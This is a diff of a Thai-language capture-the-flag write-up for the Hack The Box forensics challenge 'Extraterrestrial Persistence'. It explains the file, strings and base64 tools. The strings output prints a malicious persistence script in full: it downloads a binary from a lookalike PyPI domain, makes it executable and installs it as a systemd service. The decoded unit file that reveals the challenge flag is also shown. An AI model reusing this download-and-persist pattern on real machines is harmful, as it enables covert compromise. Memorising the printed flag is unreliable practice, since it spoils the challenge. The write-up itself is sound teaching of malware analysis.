@@ -81,4 +81,57 @@ persistence.sh: ASCII text, with very long lines (396), with CRLF line terminato
 
 ในส่วนของข้อนี้ ไฟล์ที่ชื่อว่า "persistence.sh"
 
-เดี่ยวมาต่อ ขอไปนอนก่อน...
+มันบอกว่าเป็น ASCII text 
+
+ASCII คือ รหัสมาตรฐานที่ใช้แปลงตัวอักษร ตัวเลข และสัญลักษณ์ต่างๆ ให้เป็นตัวเลขไบนารี เพื่อให้คอมพิวเตอร์เข้าใจและแลกเปลี่ยนข้อมูลกันได้ โดยใช้ 7 บิต (128 รหัส)
+
+Step 4 strings
+
+คำสั่ง strings ใช้สำหรับดึงเอาข้อความที่สามารถอ่านได้ออกมาจากไฟล์ไบนารี เช่น ไฟล์โปรแกรม, ไฟล์ออบเจ็กต์ หรือไฟล์อื่นๆ ที่ไม่ใช่ไฟล์ข้อความธรรมดา โดยจะค้นหาลำดับของอักขระที่พิมพ์ได้ (4 ตัวขึ้นไป) เพื่อให้ผู้ใช้สามารถดูข้อมูลสำคัญ, ข้อความผิดพลาด, หรือข้อมูลอื่น ๆ ที่ฝังอยู่ในไฟล์นั้นได้ง่ายขึ้น
+
+```
+┌──(kali㉿kali)-[~/Downloads/Extraterrestrial_Persistence]
+└─$ strings persistence.sh                    
+n=`whoami`
+h=`hostname`
+path='/usr/local/bin/service'
+if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi
+curl https://files.pypi-install.com/packeges/service -o $path
+chmod +x $path
+echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service
+systemctl enable service.service
+```
+
+Step 5 Base64
+
+จาก Step 4 เราจะเห็นข้อความที่ถูกเข้ารหัสด้วย Base64 อยู่ ถ้าเราไม่มั่นใจว่ามันถูกเข้ารหัสด้วย Base64 ให้สังเกตหลังเครื่องหมายไพป์ (|) มันช่วยยืนยันว่านั่นคือ Base64 
+
+```
+"W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="
+```
+
+เราสามารถทำการถอดรหัสได้ โดยใช้ CyberChef หรือคำสั่งบน Kali Linux
+
+```
+┌──(kali㉿kali)-[~/Downloads/Extraterrestrial_Persistence]
+└─$ echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==" | base64 -d
+[Unit]
+Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
+After=network.target network-online.target
+
+[Service]
+Type=oneshot
+RemainAfterExit=yes
+
+ExecStart=/usr/local/bin/service
+ExecStop=/usr/local/bin/service
+
+[Install]
+WantedBy=multi-user.target                                                                                                               
+```
+
+เพิ่มเติม
+
+- ASCII มีข้อจำกัดหลัก คือรองรับเฉพาะภาษาอังกฤษเท่านั้น ไม่สามารถแสดงผลภาษาไทย จีน หรือญี่ปุ่นได้ ด้วยเหตุนี้ ทำให้ในปัจจุบันเราจึงนิยมใช้ Unicode ซึ่งพัฒนาต่อยอดมาจาก ASCII แต่มีขนาดใหญ่กว่ามาก ทำให้สามารถบรรจุตัวอักษรได้ทุกภาษาทั่วโลกรวมถึง Emoji ด้วย
+
+- ถ้าไม่มั่นใจว่ามันคือ Base64 หรือเปล่า และไม่มีข้อมูลอะไรที่ชี้ชัด ให้เราเข้า Cipher Identifier
